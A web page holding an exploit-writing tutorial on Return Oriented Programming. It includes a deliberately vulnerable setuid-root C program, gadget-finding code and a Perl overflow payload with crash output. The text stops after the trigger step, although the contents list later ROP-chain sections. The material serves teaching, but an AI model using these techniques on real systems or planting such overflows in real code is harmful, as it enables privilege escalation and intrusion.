<!DOCTYPE html>
<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0" name="viewport"/>
  <title>
   Vincent Dary's website
  </title>
  <link href="/static/css/core.css" rel="stylesheet" type="text/css"/>
 </head>
 <body>
  <div id="j">
   <div id="a">
    <div id="f">
     <div class="by" id="chunk-left">
     </div>
     <div id="l">
      <div class="e">
       <div id="k" style="font-weight: 900;">
        <a href="../..">
         &lt;--- Back Home
        </a>
       </div>
       <h1 id="article-title">
        Exploit Writing Tutorial: ROP with Shellcode
       </h1>
       <div class="q" id="article-meta">
        <div id="article-author">
         By Vincent Dary
        </div>
        <div id="article-publish-date">
         Publish Date: 2016-03-20
        </div>
        <div id="article-last-update">
         Last Update: 2018-07-27
        </div>
       </div>
       <hr id="i"/>
       <div class="u" id="o">
        <div id="h">
         <ul>
          <li>
           <a class="toc-href" href="#1-introduction" title="1 - Introduction">
            1 - Introduction
           </a>
          </li>
          <li>
           <a class="toc-href" href="#2-tutorial-companion" title="2 - Tutorial Companion">
            2 - Tutorial Companion
           </a>
          </li>
          <li>
           <a class="toc-href" href="#3-environment" title="3 - Environment">
            3 - Environment
           </a>
           <ul>
            <li>
             <a class="toc-href" href="#31-hardware-operating-system-and-tools" title="3.1 - Hardware, Operating System and Tools">
              3.1 - Hardware, Operating System and Tools
             </a>
            </li>
            <li>
             <a class="toc-href" href="#32-vulnerable-program-sample" title="3.2 - Vulnerable Program Sample">
              3.2 - Vulnerable Program Sample
             </a>
            </li>
            <li>
             <a class="toc-href" href="#33-exploitation-environment-setting" title="3.3 - Exploitation Environment Setting">
              3.3 - Exploitation Environment Setting
             </a>
             <ul>
              <li>
               <a class="toc-href" href="#331-vulnerable-program-build" title="3.3.1 - Vulnerable Program Build">
                3.3.1 - Vulnerable Program Build
               </a>
              </li>
              <li>
               <a class="toc-href" href="#332-nx-bit-and-wx" title="3.3.2 - NX bit and W^X">
                3.3.2 - NX bit and W^X
               </a>
              </li>
              <li>
               <a class="toc-href" href="#333-aslr" title="3.3.3 - ASLR">
                3.3.3 - ASLR
               </a>
              </li>
             </ul>
            </li>
           </ul>
          </li>
          <li>
           <a class="toc-href" href="#4-return-oriented-programming_2" title="4 - Return Oriented Programming">
            4 - Return Oriented Programming
           </a>
           <ul>
            <li>
             <a class="toc-href" href="#41-introduction" title="4.1 - Introduction">
              4.1 - Introduction
             </a>
            </li>
            <li>
             <a class="toc-href" href="#42-what-is-a-gadget" title="4.2 - What is a Gadget">
              4.2 - What is a Gadget
             </a>
            </li>
            <li>
             <a class="toc-href" href="#43-find-gadgets" title="4.3 - Find Gadgets">
              4.3 - Find Gadgets
             </a>
            </li>
            <li>
             <a class="toc-href" href="#44-chain-gadgets" title="4.4 - Chain Gadgets">
              4.4 - Chain Gadgets
             </a>
            </li>
           </ul>
          </li>
          <li>
           <a class="toc-href" href="#5-vulnerability-triggering_1" title="5 - Vulnerability triggering">
            5 - Vulnerability triggering
           </a>
          </li>
          <li>
           <a class="toc-href" href="#6-exploitation-surface" title="6 - Exploitation Surface">
            6 - Exploitation Surface
           </a>
          </li>
          <li>
           <a class="toc-href" href="#7-exploit-writing" title="7 - Exploit Writing">
            7 - Exploit Writing
           </a>
           <ul>
            <li>
             <a class="toc-href" href="#71-design" title="7.1 - Design">
              7.1 - Design
             </a>
            </li>
            <li>
             <a class="toc-href" href="#72-rop-chain-1-create-a-new-wx-region" title="7.2 - ROP CHAIN 1: Create a New W+X Region">
              7.2 - ROP CHAIN 1: Create a New W+X Region
             </a>
             <ul>
              <li>
               <a class="toc-href" href="#721-mmap-syscall-overwiew" title="7.2.1 - mmap Syscall Overwiew">
                7.2.1 - mmap Syscall Overwiew
               </a>
              </li>
              <li>
               <a class="toc-href" href="#722-build" title="7.2.2 - Build">
                7.2.2 - Build
               </a>
              </li>
             </ul>
            </li>
            <li>
             <a class="toc-href" href="#73-rop-chain-2-shellcode-loader_1" title="7.3 - ROP CHAIN 2: Shellcode Loader">
              7.3 - ROP CHAIN 2: Shellcode Loader
             </a>
            </li>
            <li>
             <a class="toc-href" href="#74-rop-chain-3-eip-redirect" title="7.4 - ROP CHAIN 3: EIP Redirect">
              7.4 - ROP CHAIN 3: EIP Redirect
             </a>
            </li>
           </ul>
          </li>
          <li>
           <a class="toc-href" href="#8-conclusion_1" title="8 - Conclusion">
            8 - Conclusion
           </a>
          </li>
          <li>
           <a class="toc-href" href="#9-links" title="9 - Links">
            9 - Links
           </a>
          </li>
         </ul>
        </div>
       </div>
       <div id="m">
        <h2 id="1-introduction">
         1 - Introduction
        </h2>
        <hr>
         <p>
          This paper shows through a scenario how to write a Return Oriented Programming
based exploit which injects and executes a shellcode directly in memory while
bypassing the ASLR and the W^X protections. The required knowledges to follow
this paper are the theory of operating systems, the buffer overflow exploitation
and the shellcodes designing. All programs and source code exposed here are available
on my GitHub repository
          <a href="https://github.com/VincentDary/rop-with-shellcode" style="text-decoration: none" target="_blank">
           rop-with-shellcode [1]
          </a>
          .
         </p>
         <h2 id="2-tutorial-companion">
          2 - Tutorial Companion
         </h2>
         <hr/>
         <p>
          All the scripts, sources code and compiled program used here can be found in the
tutorial companion repository hosted on my Github account.
         </p>
         <pre class="bb">
$ git clone https://github.com/VincentDary/rop-with-shellcode.git
</pre>
         <h2 id="3-environment">
          3 - Environment
         </h2>
         <hr/>
         <h3 id="31-hardware-operating-system-and-tools">
          3.1 - Hardware, Operating System and Tools
         </h3>
         <ul>
          <li>
           Hardware: Intel x86, 32 bits
          </li>
          <li>
           Operating system: GNU/Linux (Archlinux)
          </li>
          <li>
           Development : gcc, gdb, perl, python, bash
          </li>
          <li>
           Tool:
           <a href="https://github.com/JonathanSalwan/ROPgadget" style="text-decoration: none" target="_blank">
            ROPgadget [2]
           </a>
           , netcat
          </li>
         </ul>
         <h3 id="32-vulnerable-program-sample">
          3.2 - Vulnerable Program Sample
         </h3>
         <p>
          The exploit code written in the context of this paper, is tested across the
following program. It is vulnerable to a stack based buffer overflow in the
          <code>
           foo()
          </code>
          function. The string parameter of the
          <code>
           foo()
          </code>
          function is copied in a
local buffer without performs length check. This programming error can lead to a
stack buffer overflow in the
          <code>
           buffer
          </code>
          local variable.
         </p>
         <div class="a">
          <pre><span></span><code><span class="db">#include</span><span class="fv"> </span><span class="cq">&lt;string.h&gt;</span>
<span class="db">#include</span><span class="fv"> </span><span class="cq">&lt;stdio.h&gt;</span>
<span class="db">#include</span><span class="fv"> </span><span class="cq">&lt;stdlib.h&gt;</span>

<span class="dg">int</span><span class="fv"> </span><span class="ek">foo</span><span class="ft">(</span><span class="dg">char</span><span class="fv"> </span><span class="fp">*</span><span class="fo">str</span><span class="ft">)</span>
<span class="ft">{</span>
<span class="fv">    </span><span class="dg">char</span><span class="fv"> </span><span class="fo">buffer</span><span class="ft">[</span><span class="eb">512</span><span class="ft">];</span>
<span class="fv">    </span><span class="fo">printf</span><span class="ft">(</span><span class="fu">"[buffer:0x%x] %s</span><span class="ef">\n\n</span><span class="fu">"</span><span class="ft">,</span><span class="fv"> </span><span class="fp">&amp;</span><span class="fo">buffer</span><span class="ft">,</span><span class="fv"> </span><span class="fo">str</span><span class="ft">);</span>
<span class="fv">    </span><span class="fo">strcpy</span><span class="ft">(</span><span class="fo">buffer</span><span class="ft">,</span><span class="fv"> </span><span class="fo">str</span><span class="ft">);</span>
<span class="fv">    </span><span class="fk">return</span><span class="fv"> </span><span class="eb">0</span><span class="ft">;</span>
<span class="ft">}</span>

<span class="dg">int</span><span class="fv"> </span><span class="ek">main</span><span class="ft">(</span><span class="dg">int</span><span class="fv"> </span><span class="fo">argc</span><span class="ft">,</span><span class="fv"> </span><span class="dg">char</span><span class="fv"> </span><span class="fp">*</span><span class="fo">argv</span><span class="ft">[])</span>
<span class="ft">{</span>
<span class="fv">    </span><span class="fk">if</span><span class="ft">(</span><span class="fo">argc</span><span class="fv"> </span><span class="fp">!=</span><span class="fv"> </span><span class="eb">2</span><span class="ft">)</span>
<span class="fv">    </span><span class="ft">{</span>
<span class="fv">        </span><span class="fo">sleep</span><span class="ft">(</span><span class="eb">20</span><span class="ft">);</span>
<span class="fv">        </span><span class="fo">exit</span><span class="ft">(</span><span class="eb">0</span><span class="ft">);</span>
<span class="fv">    </span><span class="ft">}</span>
<span class="fv">    </span><span class="fk">else</span>
<span class="fv">    </span><span class="ft">{</span>
<span class="fv">        </span><span class="fo">foo</span><span class="ft">(</span><span class="fo">argv</span><span class="ft">[</span><span class="eb">1</span><span class="ft">]);</span>
<span class="fv">    </span><span class="ft">}</span>
<span class="ft">}</span>
</code></pre>
         </div>
         <h3 id="33-exploitation-environment-setting">
          3.3 - Exploitation Environment Setting
         </h3>
         <p>
          The target vulnerable binary used in this tutorial is staticly compiled in
32 bit, with a non-executable stack and the stack canaries protection disable.
Then, the vulnerable binary is setted with root owner and the setuid bit.
The environment where the vulnerable binary is executed, provides the ASLR and
the W^X protection.
         </p>
         <h4 id="331-vulnerable-program-build">
          3.3.1 - Vulnerable Program Build
         </h4>
         <p>
          The vulnerable program sample is compiled with
          <code>
           gcc
          </code>
          in 32 bit (
          <code>
           -m32
          </code>
          ) with
a non-executable stack (
          <code>
           -z noexecstack
          </code>
          ), the stack canaries are disable
(
          <code>
           -fno-stack-protector
          </code>
          ) and with the static option (
          <code>
           -static
          </code>
          ) in order to
include a large set of instruction available in the code segment.
         </p>
         <pre class="bb">
$ gcc StackBasedOverflow.c -o StackBasedOverflow \
    -g -m32 \
    -static \
    -z noexecstack \
    -fno-stack-protector
</pre>
         <p>
          Then, the program is setted with the setuid bit and the root owner.
         </p>
         <pre class="bb">
# chmod u+s StackBasedOverflow
# chown root:root StackBasedOverflow
</pre>
         <h4 id="332-nx-bit-and-wx">
          3.3.2 - NX bit and W^X
         </h4>
         <p>
          The NX bit (No-eXecute) is a hardware level memory
protection which allows to mark a memory page as not executable.
On Intel x86 this feature work only if the PAE (Physical Addresse
Extension) is enable via the
          <code>
           PAE
          </code>
          flag of the
          <code>
           cr4
          </code>
          control
register and if the
          <code>
           NXE
          </code>
          flag of the
          <code>
           IA32_EFER
          </code>
          register is set
to 1. After these conditions are in place, the 64th bit of
the PDE or PTE page table entries can be used to mark
a memory page as not executable. Below, the illustration of theses conditions
extract from the Intel manual.
         </p>
         <p>
          <img alt="Intel paging modes table" src="../../blog-posts/exploit-writing-tutorial-rop-with-shellcode/intel_paging_modes.jpeg" style=" border:1px solid #000000;"/>
         </p>
         <p>
          <em>
           p.2788 Intel 64 and IA-32 Architectures Software Developer's manual, Combined Volumes
          </em>
         </p>
         <p>
          For the environment used here, the processor must provide the NX
feature. It can be activated in the BIOS parameters. The
informations contained in
          <code>
           /proc/cpuinfo
          </code>
          show if this CPU option is
available.
         </p>
         <pre class="bb">
$ cat /proc/cpuinfo | grep --color -E nx
flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall <b class="ca">nx</b> pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx smx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb invpcid_single pti tpr_shadow vnmi flexpriority ept vpid fsgsbase tsc_adjust bmi1 hle avx2 smep bmi2 erms invpcid rtm rdseed adx smap intel_pt xsaveopt ibpb ibrs stibp dtherm ida arat pln pts
</pre>
         <p>
          The kernel boot messages logs if this protection is taken
an account by the system.
         </p>
         <pre class="bb">
$ dmesg | grep "Execute Disable"
[    0.000000] NX (Execute Disable) protection: active
</pre>
         <p>
          The NX bit hardware feature is a key element (but not the only one) to implement
a W^X protection (misnomer). The goal of this protection is to prevent against
the introduction of new executable code into the
process address space.
 It consists of these following three important
          <a href="https://pax.grsecurity.net/docs/mprotect.txt" style="text-decoration: none" target="_blank">
           restrictions on a memory mapping as explain in the
PaX project [4]
          </a>
          (Note: On Intel x86, the PDE or PTE page table
  entries doesnt' have a flag to mark a page as no-readable).
         </p>
         <ul>
          <li>
           W^X
           <em>
            write xor execute
           </em>
           : A memory mapping cannot be both writable and executable.
          </li>
          <li>
           X!-&gt;W
           <em>
            execute never write
           </em>
           : An executable memory mapping cannot be mark as writable.
          </li>
          <li>
           W!-&gt;X
           <em>
            write never execute
           </em>
           : A writable memory mapping cannot be mark as executable.
          </li>
         </ul>
         <p>
          The NX bit plays a central role to implement these protections. The processors
like the Intel x86, based on a Von Neumann architecture, where data and code are
shared on the same memory, aren't designed to provide this functionality by
default. The NX bit helps to prevent the execution of any injected code in a memory
by setting memory page not executable.
When this CPU option is not available, this functionality can be
approximately emulated by software but is less effective.
         </p>
         <p>
          When the W^X protection is correctly implemented, this protection is
very efficient against arbitrary execution of an injected code in a
process.
The main techniques to bypass this protection is based on the
          <a href="https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf" style="text-decoration: none" target="_blank">
           ROP (Return Oriented Programming) [5]
          </a>
          and it's derived techniques,
which allows to perform abitrary computations in a process
protected with the W^X protection without code injection.
         </p>
         <h4 id="333-aslr">
          3.3.3 - ASLR
         </h4>
         <p>
          The ASLR (Address Space Layout Randomization) is a software level protection
which aims to map at a random base address the segments of a process at each
new execution. To be effective this protection must relies on
two main conditions.
         </p>
         <ul>
          <li>
           Compile the binary main application and its libraries as position independent code.
          </li>
          <li>
           Provide an high entropy to generate the address where a segment is loaded.
          </li>
         </ul>
         <p>
          For this tutorial the ASLR protection must be activated on the system.
         </p>
         <pre class="bb">
$ echo 2 &gt; /proc/sys/kernel/randomize_va_space
</pre>
         <p>
          The effectiveness of the ASLR depends how it is implemented and how
the protection is integrated with the binary application. When this
protection is correctly implemented and used it is very effective
to protect a process against the most of exploitation codes which need
to know fixed address to work.
         </p>
         <p>
          However this protection can be bypassed in some cases when the memory map
of the target process can be disclosed. Sometimes, It can be done with an
another dedicated exploit (ex:
          <a href="https://meltdownattack.com/" style="text-decoration: none" target="_blank">
           Meltdown and Spectre [6]
          </a>
          ),
by an other vulnerability in the program which leak its memory map
(ex:
          <a href="http://heartbleed.com/" style="text-decoration: none" target="_blank">
           Heartbleed bug [7]
          </a>
          ), by a bad integration of the application with the
ASLR (ex: not use of -fpic, -fPIC, -fpie, -fPIE gcc options)
which can left code segments at a predictable address
or by a low entropy of the ASLR.
         </p>
         <h2 id="4-return-oriented-programming_2">
          4 - Return Oriented Programming
         </h2>
         <hr/>
         <p>
          The half of the exploit code written in this paper use the ROP (Return Oriented
Programming). This section provides a quick introduction to this technique on
Intel x86 architecture and focus the ROP technique on the reuse of code
fragments also know as borrowed code chunks.
         </p>
         <h3 id="41-introduction">
          4.1 - Introduction
         </h3>
         <p>
          The ROP is a technique which allows to perform arbitrary computation in a target
process without inject any foreign executable code.
The classic way to perform an arbitrary code
execution in a target process is to hijack the execution flow to redirect it in
a shellcode injected generaly in a data memory segment. At the opposite,
in ROP based on borrowed code chunks, the hijacked execution flow is redirected
on existing sequences of executable code located in executable memory
segments provides by the process itself or by shared executable objects like
the external libraries or VDSO. Then, the execution flow executes legitimate
fragments of code contain in the process address space.
         </p>
         <p>
          A ROP exploit requires the control of the stack, or when it is not possible,
requires to pivot the stack pointer to a controlled memory area. Another
important parameter to write a ROP based exploit is to know predictable
addresses where to find executable code. This latter point, is made difficult by
the ASLR protection but possible in some cases and in some exploitation
conditions.
         </p>
         <p>
          The principal benefit of ROP compared to code injection, is that technique
bypass totaly the W^X protection against exploit codes, which allows to
execute code only in a memory page marked as executable.
         </p>
         <h3 id="42-what-is-a-gadget">
          4.2 - What is a Gadget
         </h3>
         <p>
          In ROP, a gadget is a sequence of instructions selected to modify registers and
terminated by an instruction which performs a return, like the
          <code>
           ret
          </code>
          instruction in order to pop the next
address located on the top of the controled stack on the instruction pointer
register in order to redirect the execution to an another gadget.
Note that any indirect control transfer instruction can also be used to redirect
the execution flow to another part of code.
         </p>
         <p>
          The following example is an instruction sequence which
correspond to a gadget.
         </p>
         <pre class="bb">
inc eax
ret
</pre>
         <p>
          This gadget increments the
          <code>
           eax
          </code>
          register and redirect the execution flow on the instruction pointed by the
address contain in the top of the stack.
         </p>
         <h3 id="43-find-gadgets">
          4.3 - Find Gadgets
         </h3>
         <p>
          A first way to find gadget is to dissassemble an executable file or its
shared libraries to find a group of instruction terminated by an instruction
which return. This can be done with a lot of tools, programmaticly or with a
dedicated tool.
         </p>
         <p>
          An example in command line with objdump and a grep filter.
The output is cutted for readbility.
         </p>
         <pre class="bb">
$ objdump -D -Mintel StackBasedOverflow | grep -B 5 -E ret
...
0806f490 &lt;_dl_sysinfo_int80&gt;:
 806f490:       cd 80                   int    0x80
 806f492:       c3                      ret
...
</pre>
         <p>
          Or, with a decicated tool like ROPgadget. The output is cutted for readbility.
         </p>
         <pre class="bb">
$ ROPgadget --binary StackBasedOverflow
...
0x08084581 : adc al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x080bb11e : adc al, 0x5b ; pop esi ; pop edi ; ret
0x0804fc83 : adc al, 0x5b ; pop esi ; ret
...
</pre>
         <p>
          Or programmaticly if you need to perform custom task, here an exemple in
python with Capstone and Pyelftools.
         </p>
         <div class="a">
          <pre><span></span><code><span class="dd">import</span> <span class="eh">sys</span>
<span class="dd">from</span> <span class="eh">elftools.elf.elffile</span> <span class="dd">import</span> <span class="fo">ELFFile</span>
<span class="dd">from</span> <span class="eh">capstone</span> <span class="dd">import</span> <span class="fo">Cs</span><span class="ft">,</span> <span class="fo">CS_ARCH_X86</span><span class="ft">,</span> <span class="fo">CS_MODE_32</span>

<span class="fk">def</span> <span class="ek">find_gadgets</span><span class="ft">(</span><span class="fo">elf_file</span><span class="ft">,</span> <span class="fo">section</span><span class="ft">):</span>
<span class="fv">    </span><span class="dx">""" find rop gadgets in a elf file section """</span>
    <span class="fk">with</span> <span class="en">open</span><span class="ft">(</span><span class="fo">elf_file</span><span class="ft">,</span> <span class="dp">'rb'</span><span class="ft">)</span> <span class="fk">as</span> <span class="fo">f</span><span class="ft">:</span>

        <span class="fo">elf_file</span> <span class="fp">=</span> <span class="fo">ELFFile</span><span class="ft">(</span><span class="fo">f</span><span class="ft">)</span>
        <span class="fo">code</span> <span class="fp">=</span> <span class="fo">elf_file</span><span class="fp">.</span><span class="fo">get_section_by_name</span><span class="ft">(</span><span class="fo">section</span><span class="ft">)</span>
        <span class="fo">opcodes</span> <span class="fp">=</span> <span class="fo">code</span><span class="fp">.</span><span class="fo">data</span><span class="ft">()</span>
        <span class="fo">addr</span> <span class="fp">=</span> <span class="fo">code</span><span class="ft">[</span><span class="dp">'sh_addr'</span><span class="ft">]</span>

        <span class="fo">md</span> <span class="fp">=</span> <span class="fo">Cs</span><span class="ft">(</span><span class="fo">CS_ARCH_X86</span><span class="ft">,</span> <span class="fo">CS_MODE_32</span><span class="ft">)</span>
        <span class="fo">instructions</span><span class="fp">=</span><span class="ft">[]</span>
        <span class="fk">for</span> <span class="fo">i</span> <span class="dr">in</span> <span class="fo">md</span><span class="fp">.</span><span class="fo">disasm</span><span class="ft">(</span><span class="fo">opcodes</span><span class="ft">,</span> <span class="fo">addr</span><span class="ft">):</span>
            <span class="fo">instructions</span><span class="fp">.</span><span class="fo">append</span><span class="ft">([</span><span class="en">bytes</span><span class="ft">(</span><span class="fo">i</span><span class="fp">.</span><span class="fo">bytes</span><span class="ft">),</span> <span class="fo">i</span><span class="fp">.</span><span class="fo">address</span><span class="ft">])</span>
            <span class="fk">if</span> <span class="fo">i</span><span class="fp">.</span><span class="fo">mnemonic</span> <span class="fp">==</span> <span class="dp">'ret'</span><span class="ft">:</span>
                <span class="en">print</span><span class="ft">(</span><span class="dp">'---'</span><span class="ft">)</span>
                <span class="fk">for</span> <span class="fo">z</span> <span class="dr">in</span> <span class="fo">instructions</span><span class="ft">[</span><span class="fp">-</span><span class="eb">5</span><span class="ft">:]:</span>
                  <span class="fk">for</span> <span class="fo">prev_i</span> <span class="dr">in</span> <span class="fo">md</span><span class="fp">.</span><span class="fo">disasm</span><span class="ft">(</span><span class="fo">z</span><span class="ft">[</span><span class="eb">0</span><span class="ft">],</span> <span class="fo">z</span><span class="ft">[</span><span class="eb">1</span><span class="ft">]):</span>
                      <span class="en">print</span><span class="ft">(</span><span class="dq">"0x</span><span class="dt">%x</span><span class="dq">:</span><span class="ef">\t</span><span class="dt">%s</span><span class="ef">\t</span><span class="dt">%s</span><span class="dq">"</span>
                        <span class="fp">%</span> <span class="ft">(</span><span class="fo">prev_i</span><span class="fp">.</span><span class="fo">address</span><span class="ft">,</span> <span class="fo">prev_i</span><span class="fp">.</span><span class="fo">mnemonic</span><span class="ft">,</span> <span class="fo">prev_i</span><span class="fp">.</span><span class="fo">op_str</span><span class="ft">))</span>

<span class="fk">if</span> <span class="ec">__name__</span> <span class="fp">==</span> <span class="dp">'__main__'</span><span class="ft">:</span>
<span class="fv">    </span><span class="dx">""" entry point """</span>
    <span class="fk">if</span> <span class="en">len</span><span class="ft">(</span><span class="fo">sys</span><span class="fp">.</span><span class="fo">argv</span><span class="ft">)</span> <span class="fp">==</span> <span class="eb">3</span><span class="ft">:</span>
        <span class="fo">find_gadgets</span><span class="ft">(</span><span class="fo">sys</span><span class="fp">.</span><span class="fo">argv</span><span class="ft">[</span><span class="eb">1</span><span class="ft">],</span> <span class="fo">sys</span><span class="fp">.</span><span class="fo">argv</span><span class="ft">[</span><span class="eb">2</span><span class="ft">])</span>
</code></pre>
         </div>
         <pre class="bb">
$ python3 find_gadgets.py StackBasedOverflow .text
...
0x80bb7ef:      pop     ebx
0x80bb7f0:      pop     esi
0x80bb7f1:      pop     edi
0x80bb7f2:      pop     ebp
0x80bb7f3:      ret
...
</pre>
         <h3 id="44-chain-gadgets">
          4.4 - Chain Gadgets
         </h3>
         <p>
          A ROP based exploit chains the execution of gadgets to perform abitrary
computation and to achieve its desired task like open a socket
or execute a subcommand.
         </p>
         <p>
          Bellow a basic exemple of ROP in a program vulnerable to a stack buffer
overflow. Here the stack of a vulnerable function before its corruption.
         </p>
         <pre class="h" style="font-size: 9px; font-weight: bold;">
           Low addresse
        |                |
        |----------------|  &lt;- <b class="ca">esp</b>
        |                |
        |     BUFFER     |
        |                |
        |----------------|
        |      CHUNK     |
        |----------------|  &lt;- ebp
        |    SAVE EBP    |
        |----------------|
        | RETURN ADRESSE |
        |----------------|
        |      ARG_1     |
        |----------------|
        |                |
           High addresse
</pre>
         <p>
          Next, a buffer overflow overwrites the return address of the
          <code>
           foo()
          </code>
          function with the address of the
          <code>
           pop edx
          </code>
          gadget, followed by a
chunck value of four bytes (
          <code>
           0xdeadbeef
          </code>
          ) and then the address of
the
          <code>
           inc eax
          </code>
          gadget.
         </p>
         <pre class="h" style="font-size: 9px; font-weight: bold;">
           Low adresse
        |                |
        |----------------|  &lt;- <b class="ca">esp</b>
        |   CORRUPTED    |
        |     BUFFER     |
        |                |
        |----------------|
        |overflow padding|
        |----------------|  &lt;- ebp
        |overflow padding|
        |----------------|
        |   0x080e7ba5   | --------------&gt;  0x80e7ba5    pop edx
        |----------------|                  0x80e7ba6    ret
        |   0xdeadbeef   |
        |----------------|
        |   0x0807a4f6   | --------------&gt;  0x807a4f6    inc eax
        |----------------|                  0x807a4f7    ret
        |                |
           High adresse
</pre>
         <p>
          When the
          <code>
           foo()
          </code>
          function returns in the calling function
the
          <code>
           leave; ret
          </code>
          instructions are executed. The
          <code>
           leave
          </code>
          instruction copies the value of the
          <code>
           ebp
          </code>
          register in the
          <code>
           esp
          </code>
          register and the old frame pointer is popped from
the stack into the
          <code>
           ebp
          </code>
          register to restore the calling
procedure’s stack frame.
         </p>
         <pre class="h" style="font-size: 9px; font-weight: bold;">
           Low addresse
        |                |
        |----------------|
        |   CORRUPTED    |
        |     BUFFER     |
        |                |
        |----------------|
        |overflow padding|
        |----------------|
        |overflow padding|
        |----------------| &lt;- <b class="ca">esp</b>
        |   0x080e7ba5   | --------------&gt;  0x80e7ba5    pop edx
        |----------------|                  0x80e7ba6    ret
        |   0xdeadbeef   |
        |----------------| &lt;- ebp
        |   0x0807a4f6   | --------------&gt;  0x807a4f6    inc eax
        |----------------|                  0x807a4f7    ret
        |                |
           High addresse
</pre>
         <p>
          Then, the
          <code>
           ret
          </code>
          instruction pops the value pointed by
          <code>
           esp
          </code>
          in
the
          <code>
           eip
          </code>
          register (now
          <code>
           esp
          </code>
          point to the
          <code>
           0xdeadbeef
          </code>
          value)
and
          <code>
           eip
          </code>
          point to
          <code>
           0x080e7ba5
          </code>
          , so the execution flow is
redirected to the
          <code>
           pop edx
          </code>
          instruction.
         </p>
         <pre class="h" style="font-size: 9px; font-weight: bold;">
           Low addresse
        |                |
        |----------------|
        |   CORRUPTED    |
        |     BUFFER     |
        |                |
        |----------------|
        |overflow padding|
        |----------------|
        |overflow padding|
        |----------------|
        |   0x080e7ba5   | --------------&gt;  0x80e7ba5    pop edx  &lt;- <b class="ca">eip</b>
        |----------------| &lt;- <b class="ca">esp</b>           0x80e7ba6    ret
        |   0xdeadbeef   |
        |----------------| &lt;- ebp
        |   0x0807a4f6   | ---------------&gt;  0x807a4f6    inc eax
        |----------------|                   0x807a4f7    ret
        |                |
           High addresse
</pre>
         <p>
          The
          <code>
           pop edx
          </code>
          instruction of the first gadget pops the
          <code>
           0xdeadbeef
          </code>
          value in the
          <code>
           edx
          </code>
          register (now
          <code>
           esp
          </code>
          point to
          <code>
           0x0807a4f6
          </code>
          value).
Next, the
          <code>
           ret
          </code>
          instruction is executed and pops the value pointed by
          <code>
           esp
          </code>
          in the
          <code>
           eip
          </code>
          register and
          <code>
           eip
          </code>
          point to
          <code>
           0x0807a4f6
          </code>
          , so the
execution path is redirected to the
          <code>
           inc eax
          </code>
          instruction.
         </p>
         <pre class="h" style="font-size: 9px; font-weight: bold;">
           Low addresse
        |                |
        |----------------|
        |   CORRUPTED    |
        |     BUFFER     |
        |                |
        |----------------|
        |overflow padding|
        |----------------|
        |overflow padding|
        |----------------|
        |   0x080e7ba5   | --------------&gt;  0x80e7ba5    pop edx
        |----------------|                  0x80e7ba6    ret
        |   0xdeadbeef   |
        |----------------| &lt;- ebp
        |   0x0807a4f6   | ---------------&gt;  0x807a4f6    inc eax &lt;- <b class="ca">eip</b>
        |----------------| &lt;- <b class="ca">esp</b>            0x807a4f7    ret
        |                |
           High addresse
</pre>
         <p>
          As the example shows, with the ROP technique it is possible to set the values
of registers by various ways. But it can be very time consumming to find the
appropiates gadgets to performs task like a syscall. It is why there are
framework designed specialy for this task as angrop, ropeme or roputils.
         </p>
         <h2 id="5-vulnerability-triggering_1">
          5 - Vulnerability triggering
         </h2>
         <hr/>
         <p>
          Below, a Perl script which generates a payload to trigger the stack buffer
overflow in the
          <code>
           foo()
          </code>
          function of the vulnerable program example.
         </p>
         <div class="a">
          <pre><span></span><code><span class="dk">#!/usr/bin/perl</span>

<span class="fk">use</span><span class="fv"> </span><span class="eh">strict</span><span class="ft">;</span>
<span class="fk">use</span><span class="fv"> </span><span class="eh">warnings</span><span class="ft">;</span>

<span class="fk">my</span><span class="fv"> </span><span class="eq">$padding_overflow</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="eb">524</span><span class="ft">;</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$buffer</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">""</span><span class="ft">;</span>

<span class="fk">my</span><span class="fv"> </span><span class="eq">$deadbeef</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">"\xef\xbe\xad\xde"</span><span class="ft">;</span>

<span class="eq">$buffer</span><span class="fv">  </span><span class="fp">=</span><span class="fv">  </span><span class="fu">'A'</span><span class="fv"> </span><span class="fo">x</span><span class="fv"> </span><span class="eq">$padding_overflow</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv">  </span><span class="eq">$deadbeef</span><span class="ft">;</span>

<span class="fk">print</span><span class="fv"> </span><span class="eq">$buffer</span><span class="ft">;</span>
</code></pre>
         </div>
         <p>
          The payload overflows the local
          <code>
           buffer
          </code>
          variable in the
          <code>
           foo()
          </code>
          function and
overwrites the return addresse with the
          <code>
           0xdeadbeef
          </code>
          value. This script will be
modified and completed over the course of this paper .
         </p>
         <pre class="bb">
$ ./StackBasedOverflow $(./trigger_bof.pl)
[buffer:0xff98b2b0] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
Segmentation fault
